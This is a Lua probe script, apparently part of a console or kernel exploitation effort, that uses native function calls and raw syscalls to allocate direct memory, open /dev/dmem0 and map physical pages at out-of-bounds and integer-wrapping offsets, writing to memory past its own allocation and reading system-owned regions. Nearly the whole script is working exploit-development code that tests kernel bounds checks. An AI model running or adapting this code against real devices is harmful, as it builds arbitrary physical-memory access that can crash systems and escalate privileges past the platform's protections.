-- CRASH_CLASS: HIGH
-- PROBE 802b: the remaining dmem0 bounds cases, safest first
--
-- 802a established the control (one page at our allocation works: rv=0x880000000,
-- write/read 0x1234ABCD) and that a two-page mapping over a one-page allocation does not
-- return an error — the process dies. This probe runs the remaining cases in an order where
-- the informative-but-risky ones come last:
--   [C] one page starting one physical page past the allocation  (write + read back)
--   [E] an offset whose page-index addition wraps 32 bits        (read only)
--   [D] an offset that wraps past 2^64 at page 1                 (read only)
--   [F] the system-owned head of the pool, expected to be refused (read only)
-- Every case prints its rv before touching the mapping.

print("=== PROBE 802b: DMEM0 BOUNDS, REMAINING CASES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function split(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function show(label, rv)
    local n = to_num(rv)
    if n < 0 then n = n + 0x100000000 end
    print(string.format("  %s rv=0x%X", label, n))
    return n
end
local function mapped(n) return n ~= 0xFFFFFFFF and n ~= 0 end

if not libkernel_base then print("no libkernel_base"); return end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(libkernel_base + uint64(0x17EF0), 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local ph = rq(phys_out)
local phlo = to_num(ph)
print("[0] alloc rv=" .. tostring(to_num(arv)) .. " phys=0x" .. string.format("%X", phlo))
if phlo == 0 then return end

local sc_open = make_syscall(5)
local sc_mmap = make_syscall(477)
local path = memory.alloc(16)
for i = 0, 12 do pcall(function() memory.write_byte(path + i, 0) end) end
local nm = "/dev/dmem0"
for i = 1, #nm do pcall(function() memory.write_byte(path + i - 1, nm:byte(i)) end) end
local fd = to_num(select(2, pcall(function() return sc_open(uint64(path), uint64(2), uint64(0)) end)))
print("[1] fd=" .. fd)
if fd < 0 then return end

local PROT, FLAGS = uint64(0x33), uint64(0x11)
local function mmap_at(va, len, off)
    local ok, rv = pcall(function()
        return sc_mmap(uint64(va), uint64(len), PROT, FLAGS, uint64(fd), off)
    end)
    if not ok then return -999 end
    return to_num(rv)
end

print("")
print("[A] control")
local a = mmap_at(0x880000000, 0x4000, ph)
show("A", a)
print("  write=" .. tostring(wd(0x880000000, 0xCAFEBABE)) ..
      " read=" .. string.format("%08X", rd(0x880000000) or 0))

print("")
print("[C] start one physical page past the allocation")
local c = mmap_at(0x884000000, 0x4000, split(0, phlo + 0x1000))
show("C", c)
if mapped(c) then
    print("  read=" .. string.format("%08X", rd(0x884000000) or 0))
    print("  write=" .. tostring(wd(0x884000000, 0xFEEDFACE)))
    print("  read back=" .. string.format("%08X", rd(0x884000000) or 0))
end

print("")
print("[E] 32-bit wrap of the page-index addition (read only)")
local e = mmap_at(0x888000000, 0x4000, split(0, 0xFFFFFFF000))
show("E", e)
if mapped(e) then
    print("  read=" .. string.format("%08X", rd(0x888000000) or 0))
end

print("")
print("[D] wrap past 2^64 at page 1 (read only)")
local d = mmap_at(0x88C000000, 0x4000, split(0xFFFFFFFF, 0xFFFFE000))
show("D", d)
if mapped(d) then
    print("  read=" .. string.format("%08X", rd(0x88C000000) or 0))
end

print("")
print("[F] system-owned head of the pool (read only)")
local f = mmap_at(0x88E000000, 0x4000, split(0, 0x100000000))
show("F", f)
if mapped(f) then
    print("  read=" .. string.format("%08X", rd(0x88E000000) or 0))
end

print("")
print("[G] alive pid=" .. to_num(syscall.getpid()))
